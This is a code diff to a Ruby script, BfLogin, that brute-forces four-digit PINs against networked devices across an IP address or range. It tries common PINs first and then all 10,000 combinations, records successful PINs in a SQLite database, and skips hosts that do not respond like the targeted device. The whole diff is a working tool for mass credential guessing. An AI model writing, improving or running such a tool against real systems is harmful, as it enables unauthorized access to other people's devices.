@@ -6,21 +6,26 @@ require 'net/http'
 require 'sequel'
 require 'uri'
 
+class BfLoginError < StandardError; end
+
 class BfLogin
 
-  attr_reader :address, :dbh, :errors, :responses
+  attr_reader :address, :dbh, :errors, :found, :responses
 
   def initialize(address)
     @address   = address
     @errors    = Array.new
     @responses = Array.new
+    @found     = Hash.new
 
-    db = 'bf_login.db'
+    db = 'bflogin.db'
     @dbh = Sequel.connect(sprintf('sqlite://%s', db))
+
+    initialize_db
   end
 
   def initialize_db
-    @db.create_table? :pins do
+    @dbh.create_table? :pins do
       primary_key :id
       String :ip
       String :pin
@@ -29,11 +34,16 @@ class BfLogin
   end
 
   def add_pin_to_db(ip, pin)
-    @dbh[:pins].insert(
-      :ip      => ip,
-      :pin     => pin,
-      :created => Time.now,
-    )
+    if @dbh[:pins].where(:ip => ip).count.eql?(0)
+      @dbh[:pins].insert(
+        :ip      => ip,
+        :pin     => pin,
+        :created => Time.now,
+      )
+    else
+      puts sprintf('found pin[%s] for ip[%s], but database already includes this', pin, ip)
+    end
+    @found[ip] = pin
   end
 
   # return a Net::HTTP::Post request suitable for validating +pin+
@@ -70,11 +80,19 @@ class BfLogin
     uri  = URI.parse(url)
     http = Net::HTTP.new(uri.host, uri.port)
 
+    http.open_timeout = 5
+
     request  = get_request(uri, pin)
     response = http.request(request)
 
     # <properties sys.validate-password="0"></properties>
-    response.body.match(/1/) ? true : false
+    #if response['Content-Type'].eql?('text/html') # crappy cisco devices
+    if response['Content-Type'].eql?('text/plain')
+      response.body.match(/1/) ? true : false
+    else
+      raise BfLoginError.new(sprintf('host[%s] is listening on port 80, but does not look like a revo, skipping', uri.host))
+    end
+
   end
 
 end
@@ -91,7 +109,7 @@ if address.nil?
   exit 1
 end
 
-mode = address.match(/^(?:\d{1,3}){3}\.\d{1,3}$/) ? :ip : :range
+mode = address.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/) ? :ip : :range
 targets = Array.new
 
 if mode.eql?(:ip)
@@ -103,14 +121,14 @@ elsif mode.eql?(:range)
   end
 end
 
+puts sprintf('target count[%s]', targets.size)
+
 _pins = Array.new
 9999.downto(0).to_a.each do |i|
   _pins << sprintf('%04d', i)
 end
 
 prioritized = [1234, 2546, 1739, 9876, 1425, 4152].each.collect { |i| i.to_s } # commonly used PINs
-
-# TODO come up with way to generate patterns - keys that are nearby, incremental/decremental ranges
 
 # commonly used PINs that follow a pattern
 0.upto(9) do |i|
@@ -127,7 +145,7 @@ targets.each do |target|
 
   pins.each do |pin|
     begin
-      puts sprintf('  trying pin[%s]', pin)
+      puts sprintf('  trying pin[%s] on[%s]', pin, target)
 
       response = app.check_pin(url, pin)
       app.responses << { :ip => target, :pin => pin, :results => response }
@@ -141,22 +159,18 @@ targets.each do |target|
       # this was necessary when testing against a local server, but not against real devices
       #sleep 1 if (i % 100).eql?(0)
 
+    rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT, Net::OpenTimeout => e
+      puts sprintf('ERROR: ip[%s] is not listening on 80', target)
+      break
+    rescue BfLoginError => e
+      puts e.message
+      break
     rescue => e
       puts sprintf('ERROR: something bad happened on pin[%s]: [%s:%s]', pin, e.class, e.message)
-      app.errors << { :exception => e, :pin => pin }
+      break
     end
 
   end
 
-  unless app.errors.empty?
-    app.errors.each do |e|
-      puts sprintf('ERROR: pin[%s] trace[%s]', e[:pin], e[:exception])
-    end
-
-    puts sprintf('ERROR: [%d] total errors', app.errors.size)
-  else
-    # TODO this is going to get lost in the console output when running against multiple targets -- should we stop printing the PINs attempted?
-    puts sprintf('tested[%s] PINs, found correct one[%s]', app.responses.size, )
-  end
 
 end
